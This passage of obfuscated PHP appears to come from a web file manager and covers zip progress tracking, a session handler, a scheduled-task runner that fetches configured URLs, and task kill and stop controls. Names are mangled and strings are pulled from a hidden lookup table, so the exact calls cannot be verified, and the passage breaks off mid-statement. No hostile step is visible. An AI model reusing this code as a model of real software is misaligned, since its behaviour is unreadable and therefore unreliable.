Hook::bind($ÒÇ’ßæİ[1953], array($this, $ÒÇ’ßæİ[1954])); Hook::bind($ÒÇ’ßæİ[1333], array($this, $ÒÇ’ßæİ[1955])); Hook::bind($ÒÇ’ßæİ[1956], array($this, $ÒÇ’ßæİ[1957])); $ÙÑ“± =& $this->task; $ÙÑ“±[$ÒÇ’ßæİ[1958]] = $ÒÇ’ßæİ[1334]; if (!$ÙÑ“±[$ÒÇ’ßæİ[1722]]) { $ÙÑ“±[$ÒÇ’ßæİ[1722]] = LNG($ÒÇ’ßæİ[1959]); } } protected function endAfter() { $˜ç÷ıƒà =& $_SERVER[¬ÏÕ§Áú]; parent::endAfter(); Hook::unbind($˜ç÷ıƒà[1953], array($this, $˜ç÷ıƒà[1954])); Hook::unbind($˜ç÷ıƒà[1333], array($this, $˜ç÷ıƒà[1955])); Hook::unbind($˜ç÷ıƒà[1956], array($this, $˜ç÷ıƒà[1957])); } public function updateAfter() { $ÚÏ»ïŞ =& $_SERVER[¬ÏÕ§Áú]; $Ù³ôº­ =& $this->task; if (!$Ù³ôº­[$ÚÏ»ïŞ[1188]] || !$Ù³ôº­[$ÚÏ»ïŞ[877]]) { if ($Ù³ôº­[$ÚÏ»ïŞ[1958]] != $ÚÏ»ïŞ[399]) { return; } } if ($Ù³ôº­[$ÚÏ»ïŞ[1958]] == $ÚÏ»ïŞ[1334]) { $¯İŸ¶‚¿ = 0; if ($Ù³ôº­[$ÚÏ»ïŞ[1891]]) { $¯İŸ¶‚¿ = $Ù³ôº­[$ÚÏ»ïŞ[1892]] / $Ù³ôº­[$ÚÏ»ïŞ[1891]]; } $Ù³ôº­[$ÚÏ»ïŞ[1839]] = $¯İŸ¶‚¿ * 0.3; } else { if ($Ù³ôº­[$ÚÏ»ïŞ[1958]] == $ÚÏ»ïŞ[399]) { $¯İŸ¶‚¿ = $Ù³ôº­[$ÚÏ»ïŞ[1838]] / $Ù³ôº­[$ÚÏ»ïŞ[1188]]; $Ù³ôº­[$ÚÏ»ïŞ[1839]] = 0.3 + $¯İŸ¶‚¿ * 0.4; } else { if ($Ù³ôº­[$ÚÏ»ïŞ[1958]] == $ÚÏ»ïŞ[120]) { $“û·ˆ® = 0; if ($Ù³ôº­[$ÚÏ»ïŞ[1893]] == $ÚÏ»ïŞ[120]) { $“û·ˆ® = $Ù³ôº­[$ÚÏ»ïŞ[1892]]; } $¯İŸ¶‚¿ = ($Ù³ôº­[$ÚÏ»ïŞ[1896]] + $“û·ˆ®) / $Ù³ôº­[$ÚÏ»ïŞ[877]]; $Ù³ôº­[$ÚÏ»ïŞ[1839]] = 0.3 + 0.4 + $¯İŸ¶‚¿ * 0.3; } } } if ($Ù³ôº­[$ÚÏ»ïŞ[1839]] > 0) { $Ñ–¨˜Ã = timeFloat() - $Ù³ôº­[$ÚÏ»ïŞ[1841]] - $Ù³ôº­[$ÚÏ»ïŞ[1844]]; $Ù³ôº­[$ÚÏ»ïŞ[1845]] = $Ñ–¨˜Ã * (1 - $Ù³ôº­[$ÚÏ»ïŞ[1839]]) / $Ù³ôº­[$ÚÏ»ïŞ[1839]]; } } public function addFile($Ú¾Ê˜ñŒ) { $‡Â®˜Ûï =& $_SERVER[¬ÏÕ§Áú]; $ñÀÜ¼å =& $this->task; $í¿±¶Ç“ = IO::info($Ú¾Ê˜ñŒ); $ñÀÜ¼å[$‡Â®˜Ûï[1889]] = $í¿±¶Ç“[$‡Â®˜Ûï[32]]; $ñÀÜ¼å[$‡Â®˜Ûï[1891]] = $í¿±¶Ç“[$‡Â®˜Ûï[89]]; $ñÀÜ¼å[$‡Â®˜Ûï[1892]] = 0; $ñÀÜ¼å[$‡Â®˜Ûï[1190]] = $‡Â®˜Ûï[1912]; $ñÀÜ¼å[$‡Â®˜Ûï[1893]] = $‡Â®˜Ûï[1334]; $ñÀÜ¼å[$‡Â®˜Ûï[877]] = $í¿±¶Ç“[$‡Â®˜Ûï[89]]; $ñÀÜ¼å[$‡Â®˜Ûï[1188]] = 1; $Êµ™Úü = 0; $ñÀÜ¼å[$‡Â®˜Ûï[1900]] = array($‡Â®˜Ûï[1901] => $Êµ™Úü + 1, $‡Â®˜Ûï[514] => $í¿±¶Ç“[$‡Â®˜Ûï[32]], $‡Â®˜Ûï[97] => $í¿±¶Ç“[$‡Â®˜Ûï[97]], $‡Â®˜Ûï[603] => $í¿±¶Ç“[$‡Â®˜Ûï[603]] ? $í¿±¶Ç“[$‡Â®˜Ûï[603]] : $í¿±¶Ç“[$‡Â®˜Ûï[97]]); $this->update(); } public function zipEvent($ÆğìïïÀ, $®ªÚÅêô, $¬Ûıæ¤º, $Ì…ÑÌ¡ó) { $†•Íú‘Û =& $_SERVER[¬ÏÕ§Áú]; $Áà¨ÍĞ¶ =& $this->task; $Áà¨ÍĞ¶[$†•Íú‘Û[1889]] = get_path_this($®ªÚÅêô); $Áà¨ÍĞ¶[$†•Íú‘Û[1891]] = $Ì…ÑÌ¡ó; $Áà¨ÍĞ¶[$†•Íú‘Û[1892]] = $¬Ûıæ¤º; $Áà¨ÍĞ¶[$†•Íú‘Û[1190]] = $ÆğìïïÀ == $†•Íú‘Û[1960] ? $†•Íú‘Û[1961] : $†•Íú‘Û[1962]; $Áà¨ÍĞ¶[$†•Íú‘Û[1893]] = $†•Íú‘Û[12]; $Áà¨ÍĞ¶[$†•Íú‘Û[877]] = $Ì…ÑÌ¡ó; $Áà¨ÍĞ¶[$†•Íú‘Û[1958]] = $†•Íú‘Û[399]; $this->update(); } public function unzipAfter($ãó¢É—Ã) { $‰¢éÅÆÀ =& $_SERVER[¬ÏÕ§Áú]; $–şğ€Ïš =& $this->task; $–şğ€Ïš[$‰¢éÅÆÀ[1958]] = $‰¢éÅÆÀ[120]; $‚ÃÓÔ–ã = IO::infoWithChildren($ãó¢É—Ã); $—ÕıäÃ = 0; $–şğ€Ïš[$‰¢éÅÆÀ[1900]] = array($‰¢éÅÆÀ[1901] => $—ÕıäÃ + 1, $‰¢éÅÆÀ[514] => $‚ÃÓÔ–ã[$‰¢éÅÆÀ[32]], $‰¢éÅÆÀ[97] => $‚ÃÓÔ–ã[$‰¢éÅÆÀ[97]], $‰¢éÅÆÀ[603] => $‚ÃÓÔ–ã[$‰¢éÅÆÀ[603]] ? $‚ÃÓÔ–ã[$‰¢éÅÆÀ[603]] : $‚ÃÓÔ–ã[$‰¢éÅÆÀ[97]]); if ($‚ÃÓÔ–ã[$‰¢éÅÆÀ[33]] == $‰¢éÅÆÀ[243]) { $–şğ€Ïš[$‰¢éÅÆÀ[1188]] = 1; } else { $–şğ€Ïš[$‰¢éÅÆÀ[1188]] = $‚ÃÓÔ–ã[$‰¢éÅÆÀ[92]][$‰¢éÅÆÀ[90]]; } $–şğ€Ïš[$‰¢éÅÆÀ[1190]] = $‰¢éÅÆÀ[12]; $–şğ€Ïš[$‰¢éÅÆÀ[1893]] = 0; $–şğ€Ïš[$‰¢éÅÆÀ[1838]] = 0; $–şğ€Ïš[$‰¢éÅÆÀ[1891]] = 0; $–şğ€Ïš[$‰¢éÅÆÀ[1892]] = 0; $–şğ€Ïš[$‰¢éÅÆÀ[1889]] = $‰¢éÅÆÀ[12]; $–şğ€Ïš[$‰¢éÅÆÀ[1896]] = 0; $–şğ€Ïš[$‰¢éÅÆÀ[877]] = $‚ÃÓÔ–ã[$‰¢éÅÆÀ[89]]; $this->update(); self::log($‰¢éÅÆÀ[1963] . json_encode(array($–şğ€Ïš, $‚ÃÓÔ–ã))); } public function nameParse($ï·î÷‘Æ) { $·ƒÅ­í¥ =& $_SERVER[¬ÏÕ§Áú]; $ï˜ø–ï =& $this->task; if ($ï˜ø–ï[$·ƒÅ­í¥[1958]] == $·ƒÅ­í¥[1334]) { $ï˜ø–ï[$·ƒÅ­í¥[1958]] = $·ƒÅ­í¥[399]; $ï˜ø–ï[$·ƒÅ­í¥[1896]] = 0; $ï˜ø–ï[$·ƒÅ­í¥[877]] = 0; } $œ×…ØªŠ = get_path_this($ï·î÷‘Æ); if (strstr($œ×…ØªŠ, $·ƒÅ­í¥[10])) { $ï˜ø–ï[$·ƒÅ­í¥[1838]] += 1; $ï˜ø–ï[$·ƒÅ­í¥[1188]] += 1; } $ï˜ø–ï[$·ƒÅ­í¥[1889]] = $ï·î÷‘Æ; $this->update(); } } goto d¶ÚÙÁÔ; d‡—‘íã÷°: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $è²Â†äê =& $_SERVER[¬ÏÕ§Áú]; static $ï£ß„úø = false; if ($ï£ß„úø) { return $ï£ß„úø; } $›—Ç¶ÍĞ = $GLOBALS[$è²Â†äê[6]][$è²Â†äê[435]]; self::$sessionTime = $›—Ç¶ÍĞ[$è²Â†äê[1782]]; $’‰ñ»½µ = isset($GLOBALS[$è²Â†äê[1783]]) ? $GLOBALS[$è²Â†äê[1783]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($’‰ñ»½µ)) { self::$sessionSign = Cookie::get($’‰ñ»½µ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($’‰ñ»½µ, self::$sessionSign, self::$sessionTime); $¡‘ˆ–…° = $›—Ç¶ÍĞ[$è²Â†äê[1784]]; $Éç“‹†­ = $›—Ç¶ÍĞ[$¡‘ˆ–…°]; $¤¥½èÕ = $›—Ç¶ÍĞ[$è²Â†äê[949]]; switch ($¡‘ˆ–…°) { case $è²Â†äê[21]: self::$handle = Model($è²Â†äê[950]); break; case $è²Â†äê[951]: self::$handle = new CacheRedis($Éç“‹†­, $¤¥½èÕ); break; case $è²Â†äê[952]: self::$handle = new CacheMemcached($Éç“‹†­, $¤¥½èÕ); break; case $è²Â†äê[243]: $Éç“‹†­[$è²Â†äê[97]] = $Éç“‹†­[$è²Â†äê[97]] . $è²Â†äê[1785]; self::$handle = new CacheFile($Éç“‹†­, $¤¥½èÕ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ï£ß„úø = new self(); return $ï£ß„úø; } public static function getBySign($×ÍşôÆº) { $‘ÛÀ£¨ı = self::$handle->get($×ÍşôÆº); $‘ÛÀ£¨ı = unserialize($‘ÛÀ£¨ı); return is_array($‘ÛÀ£¨ı) ? $‘ÛÀ£¨ı : array(); } public static function setBySign($à¹¸·¾¤, $æî¨¸ì‰) { CacheLock::lock($à¹¸·¾¤); self::$handle->set($à¹¸·¾¤, serialize($æî¨¸ì‰), self::$sessionTime); CacheLock::unlock($à¹¸·¾¤); } public static function sign($šÇŠäÚ = false) { if ($šÇŠäÚ) { self::$sessionSign = $šÇŠäÚ; } self::init(); return self::$sessionSign; } public static function set($Í¬—ª«û, $ÎÚŠÆ…± = false) { self::init(); if (is_array($Í¬—ª«û)) { foreach ($Í¬—ª«û as $°ÖïÅ¾– => $†’½îßÙ) { array_set_value(self::$data, $°ÖïÅ¾–, $†’½îßÙ); } } else { array_set_value(self::$data, $Í¬—ª«û, $ÎÚŠÆ…±); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÊÅò»Ş = false) { self::init(); if (!$ÊÅò»Ş) { return self::$data; } return array_get_value(self::$data, $ÊÅò»Ş); } public static function remove($ÜºÚâµ‚) { self::init(); unset(self::$data[$ÜºÚâµ‚]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¬ÏÕ§Áú][958])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $äğ·ƒƒ  =& $_SERVER[¬ÏÕ§Áú]; if (self::valueGet($äğ·ƒƒ [863]) != $äğ·ƒƒ [101]) { return; } if (self::valueGet($äğ·ƒƒ [1786]) == $äğ·ƒƒ [101]) { $«üì¯ŸÇ = self::valueGet($äğ·ƒƒ [1787]); if (time() - $«üì¯ŸÇ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($äğ·ƒƒ [1786], $äğ·ƒƒ [101]); self::log($äğ·ƒƒ [1788] . ACTION . $äğ·ƒƒ [1789]); Hook::bind($äğ·ƒƒ [1790], $äğ·ƒƒ [1791]); $îÏÚºôË = 0; while (!0) { self::cacheClear(); if (self::valueGet($äğ·ƒƒ [863]) != $äğ·ƒƒ [101]) { self::valueSet($äğ·ƒƒ [1786], $äğ·ƒƒ [241]); self::log($äğ·ƒƒ [1792]); die; } $µ¥ƒ¶†â = time(); if ($µ¥ƒ¶†â - $îÏÚºôË >= 60) { self::valueSet(array($äğ·ƒƒ [1786] => $äğ·ƒƒ [101], $äğ·ƒƒ [1787] => $µ¥ƒ¶†â)); $îÏÚºôË = $µ¥ƒ¶†â; } if (!file_exists(USER_SYSTEM . $äğ·ƒƒ [1793])) { self::valueSet(array($äğ·ƒƒ [1786] => $äğ·ƒƒ [241], $äğ·ƒƒ [863] => $äğ·ƒƒ [241])); self::log($äğ·ƒƒ [1794]); die; } $ª²€‡æ = file_get_contents(BASIC_PATH . $äğ·ƒƒ [1795]); $¹Ÿ›èŠº = KOD_VERSION . $äğ·ƒƒ [10] . KOD_VERSION_BUILD; $½‰ğ´Û® = match_text($ª²€‡æ, $äğ·ƒƒ [1796]) . $äğ·ƒƒ [10] . match_text($ª²€‡æ, $äğ·ƒƒ [1797]); if ($½‰ğ´Û® != $¹Ÿ›èŠº) { self::restart(); self::log("\x73\x74\157\x70\x65\x64\x2e\133\166\145\x72\x73\151\x6f\156\40\165\x70\144\141\x74\145\x3b{$versionNow}\x20\75\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ãÓì±òÂ =& $_SERVER[¬ÏÕ§Áú]; http_close(); $GLOBALS[$ãÓì±òÂ[1798]] = 1; $_SERVER[$ãÓì±òÂ[1799]] = $ãÓì±òÂ[1800]; $_COOKIE = array(); $GLOBALS[$ãÓì±òÂ[1801]] = 1; $GLOBALS[$ãÓì±òÂ[1802]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ ’ª¼Ò½ =& $_SERVER[¬ÏÕ§Áú]; http_close(); self::valueSet($ ’ª¼Ò½[863], $ ’ª¼Ò½[241]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ ’ª¼Ò½[1786] => $ ’ª¼Ò½[241], $ ’ª¼Ò½[863] => $ ’ª¼Ò½[101])); self::log($ ’ª¼Ò½[1803]); } public static function taskSwitch() { $Âî¢¿ŠŒ =& $_SERVER[¬ÏÕ§Áú]; $Ûä„™– = self::valueGet($Âî¢¿ŠŒ[863]) == $Âî¢¿ŠŒ[101] ? $Âî¢¿ŠŒ[241] : $Âî¢¿ŠŒ[101]; self::valueSet($Âî¢¿ŠŒ[863], $Ûä„™–); } public static function shutdownEvent() { $ÓñÃŒ³ª =& $_SERVER[¬ÏÕ§Áú]; self::valueSet($ÓñÃŒ³ª[1786], $ÓñÃŒ³ª[241]); self::log($ÓñÃŒ³ª[1804]); } public static function config($†ÙÅùùô, $º¶‘Çˆ) { self::valueSet($_SERVER[¬ÏÕ§Áú][863], $†ÙÅùùô); } private static function taskRunAll() { $™øŞû¡ =& $_SERVER[¬ÏÕ§Áú]; $Ş¾®º™Ê = timeFloat(); $üÓ¶øµø = Model($™øŞû¡[1805])->listData(); $Œ‹œ¼Æ² = count($üÓ¶øµø); for ($ÀÌÙËáÓ = 0; $ÀÌÙËáÓ < $Œ‹œ¼Æ²; $ÀÌÙËáÓ++) { $âòÇŞ§ƒ = $üÓ¶øµø[$ÀÌÙËáÓ]; if (!$âòÇŞ§ƒ[$™øŞû¡[492]] || $âòÇŞ§ƒ[$™øŞû¡[1806]] != $™øŞû¡[101]) { continue; } if (!self::taskTimeCheck($âòÇŞ§ƒ)) { continue; } self::taskRun($âòÇŞ§ƒ); } Hook::trigger($™øŞû¡[1807]); self::taskQueueRun($Ş¾®º™Ê); } private static function taskQueueRun($şÁëêû…) { $»İÓ‰š¯ = 10; while (!0) { $µ¼Ùƒßƒ = TaskQueue::run(); if ($µ¼Ùƒßƒ === !1) { break; } if (timeFloat() - $şÁëêû… >= $»İÓ‰š¯) { break; } } } private static function taskTimeCheck($Ğ’ğÊÚŠ) { $·ˆè¢ûí =& $_SERVER[¬ÏÕ§Áú]; $ªä˜ÔÜ¯ = json_decode($Ğ’ğÊÚŠ[$·ˆè¢ûí[217]], !0); $èö¬ï = intval($Ğ’ğÊÚŠ[$·ˆè¢ûí[1787]]); $ÒæÅ˜¾¨ = strtotime($·ˆè¢ûí[1808] . $ªä˜ÔÜ¯[$·ˆè¢ûí[1809]] . $·ˆè¢ûí[1810]) - strtotime($·ˆè¢ûí[1811]); $ü¯ÕÔ‡™ = time() - strtotime(date($·ˆè¢ûí[1812]) . $·ˆè¢ûí[1813]); $ğ¸…¢ = $ü¯ÕÔ‡™ >= $ÒæÅ˜¾¨ && $ü¯ÕÔ‡™ <= $ÒæÅ˜¾¨ + 3600; switch ($ªä˜ÔÜ¯[$·ˆè¢ûí[33]]) { case $·ˆè¢ûí[1814]: if (time() - $èö¬ï < 3600 * 24 * 30) { return !1; } if ($ªä˜ÔÜ¯[$·ˆè¢ûí[1814]] == date($·ˆè¢ûí[1815]) && $ğ¸…¢) { return !0; } break; case $·ˆè¢ûí[1816]: if (time() - $èö¬ï < 3600 * 24 * 7) { return !1; } $ ›µ÷…Ò = date($·ˆè¢ûí[1817]) == 0 ? 7 : date($·ˆè¢ûí[1817]); if ($ªä˜ÔÜ¯[$·ˆè¢ûí[1816]] == $ ›µ÷…Ò && $ğ¸…¢) { return !0; } break; case $·ˆè¢ûí[1809]: if (time() - $èö¬ï < 3600 * 24) { return !1; } if ($ğ¸…¢) { return !0; } break; case $·ˆè¢ûí[1818]: if (time() - $èö¬ï >= floatval($ªä˜ÔÜ¯[$·ˆè¢ûí[1818]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $í‡š—‰ =& $_SERVER[¬ÏÕ§Áú]; static $ùı˜ˆ´ã = 0; $Î¼Öé‰Î = 300; if (!$ùı˜ˆ´ã) { $ùı˜ˆ´ã = time(); } if (time() - $ùı˜ˆ´ã < $Î¼Öé‰Î) { return; } $ùı˜ˆ´ã = time(); $ÏôìÌà = Model($í‡š—‰[598])->db($í‡š—‰[12]); if ($ÏôìÌà) { $ÏôìÌà->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($í‡š—‰[1819], $í‡š—‰[1820]); die; } } public static function taskRun($¼Ÿø‡©¬) { $ú”ş’·¯ =& $_SERVER[¬ÏÕ§Áú]; self::log($ú”ş’·¯[1821] . $¼Ÿø‡©¬[$ú”ş’·¯[492]] . $ú”ş’·¯[1822] . $¼Ÿø‡©¬[$ú”ş’·¯[32]] . $ú”ş’·¯[1823] . $¼Ÿø‡©¬[$ú”ş’·¯[1824]]); Model($ú”ş’·¯[1805])->run($¼Ÿø‡©¬[$ú”ş’·¯[492]]); $Ñç§…ô¯ = timeFloat(); $ä Ô˜Û› = $ú”ş’·¯[12]; switch ($¼Ÿø‡©¬[$ú”ş’·¯[33]]) { case $ú”ş’·¯[393]: $À•Å– Ñ = url_request($¼Ÿø‡©¬[$ú”ş’·¯[1824]], $ú”ş’·¯[1558], !1, !1, !1, !1, 10); if ($À•Å– Ñ[$ú”ş’·¯[863]]) { $ä Ô˜Û› = strlen($À•Å– Ñ[$ú”ş’·¯[1342]]); } break; case $ú”ş’·¯[1825]: $ä Ô˜Û› = Hook::apply($¼Ÿø‡©¬[$ú”ş’·¯[1824]]); default: break; } Model($ú”ş’·¯[1826])->add(array($ú”ş’·¯[1827] => $ú”ş’·¯[12], $ú”ş’·¯[1828] => $ú”ş’·¯[241], $ú”ş’·¯[33] => $ú”ş’·¯[1829] . $¼Ÿø‡©¬[$ú”ş’·¯[492]], $ú”ş’·¯[1830] => json_encode(array($ú”ş’·¯[32] => $¼Ÿø‡©¬[$ú”ş’·¯[32]], $ú”ş’·¯[1831] => timeFloat() - $Ñç§…ô¯, $ú”ş’·¯[869] => $ä Ô˜Û›)))); $ùÅúú“Ş = $ä Ô˜Û› ? $ú”ş’·¯[1832] . $ä Ô˜Û› : $ú”ş’·¯[12]; self::log($ú”ş’·¯[1833] . $¼Ÿø‡©¬[$ú”ş’·¯[492]] . $ú”ş’·¯[188] . $ùÅúú“Ş); return !0; } public static function valueGet($Ú èíà) { $û¢¯“¿• =& $_SERVER[¬ÏÕ§Áú]; $­ÓîÀÂ± = $û¢¯“¿•[1834]; $ÛñØ“šü = Model($û¢¯“¿•[527])->get($Ú èíà, $­ÓîÀÂ±); if (is_null($ÛñØ“šü)) { Model($û¢¯“¿•[527])->set($û¢¯“¿•[863], $û¢¯“¿•[101], $­ÓîÀÂ±); Model($û¢¯“¿•[527])->set($û¢¯“¿•[1786], $û¢¯“¿•[241], $­ÓîÀÂ±); $ÛñØ“šü = Model($û¢¯“¿•[527])->get($Ú èíà, $­ÓîÀÂ±); } return $ÛñØ“šü; } private static function valueSet($«ÇÕ–¹ä, $ÅÅš„½Î = false) { $Ş‡Èãö¨ =& $_SERVER[¬ÏÕ§Áú]; $£ŒÃ·ë² = $Ş‡Èãö¨[1835]; CacheLock::lock($£ŒÃ·ë²); $ü’Úµı³ = Model($Ş‡Èãö¨[527])->set($«ÇÕ–¹ä, $ÅÅš„½Î, $Ş‡Èãö¨[1834]); CacheLock::unlock($£ŒÃ·ë²); return $ü’Úµı³; } protected static function log($„¤ÕûŞ) { write_log($„¤ÕûŞ, $_SERVER[¬ÏÕ§Áú][1820]); } private static function cacheClear() { $º‰»í¦ =& $_SERVER[¬ÏÕ§Áú]; Cache::clearMemory(Model($º‰»í¦[527])->cacheKey($º‰»í¦[1834])); Cache::clearMemory(Model($º‰»í¦[527])->cacheKey($º‰»í¦[1836])); Model($º‰»í¦[1805])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($åÎÒËÛö, $Ä›Ä§ş = '', $Ä¬òáÂ‚ = 0, $¸±çˆÅ¯ = '') { $Ó•ƒİˆ‰ =& $_SERVER[¬ÏÕ§Áú]; if (self::get($åÎÒËÛö)) { return; } $this->task = array($Ó•ƒİˆ‰[492] => $åÎÒËÛö, $Ó•ƒİˆ‰[1837] => USER_ID, $Ó•ƒİˆ‰[1722] => $¸±çˆÅ¯, $Ó•ƒİˆ‰[545] => $Ó•ƒİˆ‰[12], $Ó•ƒİˆ‰[33] => $Ä›Ä§ş, $Ó•ƒİˆ‰[1190] => $Ó•ƒİˆ‰[12], $Ó•ƒİˆ‰[1188] => $Ä¬òáÂ‚, $Ó•ƒİˆ‰[1838] => 0, $Ó•ƒİˆ‰[1839] => 0, $Ó•ƒİˆ‰[1840] => 0, $Ó•ƒİˆ‰[1841] => timeFloat(), $Ó•ƒİˆ‰[1842] => 0, $Ó•ƒİˆ‰[1843] => 0, $Ó•ƒİˆ‰[1844] => 0, $Ó•ƒİˆ‰[1845] => 0, $Ó•ƒİˆ‰[863] => $Ó•ƒİˆ‰[1786]); $GLOBALS[$Ó•ƒİˆ‰[1846]] = 1; Hook::bind($Ó•ƒİˆ‰[1790], array($this, $Ó•ƒİˆ‰[1847])); Hook::bind($Ó•ƒİˆ‰[1848], array($this, $Ó•ƒİˆ‰[1849])); $this->startAfter(); Hook::trigger($Ó•ƒİˆ‰[1850], $this->task); $this->task[$Ó•ƒİˆ‰[1843]] = timeFloat(); } public function end($ßí˜º± = '') { $„Ç—â”¦ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$„Ç—â”¦[1843]]) { self::valueSet($this->task[$„Ç—â”¦[492]], !1); } $this->isEnd = !0; if ($ßí˜º±) { $this->task[$„Ç—â”¦[545]] = $ßí˜º±; } self::log($„Ç—â”¦[1851] . $this->task[$„Ç—â”¦[492]] . $„Ç—â”¦[1852] . sprintf($„Ç—â”¦[976], timeFloat() - $this->task[$„Ç—â”¦[1841]]) . $„Ç—â”¦[1853]); Hook::unbind($„Ç—â”¦[1790], array($this, $„Ç—â”¦[1847])); Hook::unbind($„Ç—â”¦[1848], array($this, $„Ç—â”¦[1849])); $this->endAfter(); $±–»®é = $this->task; $this->task = !1; Hook::trigger($„Ç—â”¦[1854], $±–»®é); } public function update($Ô€Æ³äÁ = 0, $ÌÈ¬Ø´ = false) { $Ò‹ßó =& $_SERVER[¬ÏÕ§Áú]; $¹³úûÛ¢ =& $this->task; if (!$¹³úûÛ¢) { return; } $¹³úûÛ¢[$Ò‹ßó[1838]] += $Ô€Æ³äÁ; $¹³úûÛ¢[$Ò‹ßó[1842]] = timeFloat(); if ($¹³úûÛ¢[$Ò‹ßó[1188]]) { if ($¹³úûÛ¢[$Ò‹ßó[1188]] < $¹³úûÛ¢[$Ò‹ßó[1838]]) { $¹³úûÛ¢[$Ò‹ßó[1188]] = $¹³úûÛ¢[$Ò‹ßó[1838]]; } $ˆè”ÎÀü = timeFloat() - $¹³úûÛ¢[$Ò‹ßó[1841]] - $¹³úûÛ¢[$Ò‹ßó[1844]]; if ($ˆè”ÎÀü <= 0) { $ˆè”ÎÀü = 0.001; } $¹³úûÛ¢[$Ò‹ßó[1839]] = $¹³úûÛ¢[$Ò‹ßó[1838]] / $¹³úûÛ¢[$Ò‹ßó[1188]]; $¹³úûÛ¢[$Ò‹ßó[1840]] = $¹³úûÛ¢[$Ò‹ßó[1838]] / $ˆè”ÎÀü; if ($¹³úûÛ¢[$Ò‹ßó[1839]] > 0) { $¹³úûÛ¢[$Ò‹ßó[1845]] = $ˆè”ÎÀü * (1 - $¹³úûÛ¢[$Ò‹ßó[1839]]) / $¹³úûÛ¢[$Ò‹ßó[1839]]; } $¹³úûÛ¢[$Ò‹ßó[1845]] = $¹³úûÛ¢[$Ò‹ßó[1845]] <= 0 ? 0 : $¹³úûÛ¢[$Ò‹ßó[1845]]; } $this->updateAfter(); $áÓÛî¥À = 0.2; if (timeFloat() - $¹³úûÛ¢[$Ò‹ßó[1843]] < $áÓÛî¥À && !$ÌÈ¬Ø´) { return; } $œÅ—Ä¢ğ = self::get($¹³úûÛ¢[$Ò‹ßó[492]]); $¯í±àÃ© = $œÅ—Ä¢ğ[$Ò‹ßó[863]]; if ($¯í±àÃ© == self::STATYS_KILL) { $şò½ŞÚû = array($Ò‹ßó[1855] => LNG($Ò‹ßó[1856]), $Ò‹ßó[1352] => !1); Cache::set($Ò‹ßó[1857] . $this->task[$Ò‹ßó[492]], $şò½ŞÚû, 30); $this->onKill(); $this->end(); die; } else { if ($¯í±àÃ© == self::STATYS_STOP) { $î†øÊ‘™ = 2; $œÅ—Ä¢ğ[$Ò‹ßó[1844]] += $î†øÊ‘™; self::valueSet($¹³úûÛ¢[$Ò‹ßó[492]], $œÅ—Ä¢ğ); sleep($î†øÊ‘™); $this->update(); return; } } $¹³úûÛ¢[$Ò‹ßó[863]] = $¯í±àÃ© ? $¯í±àÃ© : $¹³úûÛ¢[$Ò‹ßó[863]]; $¹³úûÛ¢[$Ò‹ßó[1844]] = $œÅ—Ä¢ğ[$Ò‹ßó[1844]] ? $œÅ—Ä¢ğ[$Ò‹ßó[1844]] : 0; $¹³úûÛ¢[$Ò‹ßó[1843]] = timeFloat(); Hook::trigger($Ò‹ßó[1858], $¹³úûÛ¢); self::valueSet($¹³úûÛ¢[$Ò‹ßó[492]], $¹³úûÛ¢); } public function onKillSet($•‚ñ®¸õ, $šÑñƒ¡à = array()) { $this->onKillCall = array($•‚ñ®¸õ, $šÑñƒ¡à); } public function onKill() { $é’€£ÄÍ =& $_SERVER[¬ÏÕ§Áú]; self::log($é’€£ÄÍ[1851] . $this->task[$é’€£ÄÍ[492]] . $é’€£ÄÍ[1859]); Hook::trigger($é’€£ÄÍ[1860], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($òñğªÂ½) { $ä´£¡¬ =& $_SERVER[¬ÏÕ§Áú]; Cache::set($ä´£¡¬[1857] . $this->task[$ä´£¡¬[492]], $òñğªÂ½, 60); if (!is_array($òñğªÂ½) || !$òñğªÂ½[$ä´£¡¬[1352]]) { self::log($ä´£¡¬[1861] . json_encode($òñğªÂ½)); } return $òñğªÂ½; } public static function get($åĞ©ò©) { $öÁŞüÊ± =& $_SERVER[¬ÏÕ§Áú]; $şÒŞ†Äš = self::valueGet($åĞ©ò©); if (is_array($şÒŞ†Äš) && $şÒŞ†Äš[$öÁŞüÊ±[1862]]) { $Í·µŸî = ActionApply($şÒŞ†Äš[$öÁŞüÊ±[1862]], array($şÒŞ†Äš)); $şÒŞ†Äš = is_array($Í·µŸî) ? $Í·µŸî : $şÒŞ†Äš; } return $şÒŞ†Äš; } public static function listData() { $„ôá§Éá = self::valueGet(); return array_sort_by($„ôá§Éá, $_SERVER[¬ÏÕ§Áú][1841], !0); } public static function kill($ìÏ¨÷±ï) { return self::changeStatus($ìÏ¨÷±ï, self::STATYS_KILL); } public static function stop($ºœ“…¶Â) { return self::changeStatus($ºœ“…¶Â, self::STATYS_STOP); } public static function restart($Ÿï˜”œ‚) { return self::changeStatus($Ÿï˜”œ‚, self::STATYS_RUNNING); } public static function killAll() { $”ˆµëë¹ =& 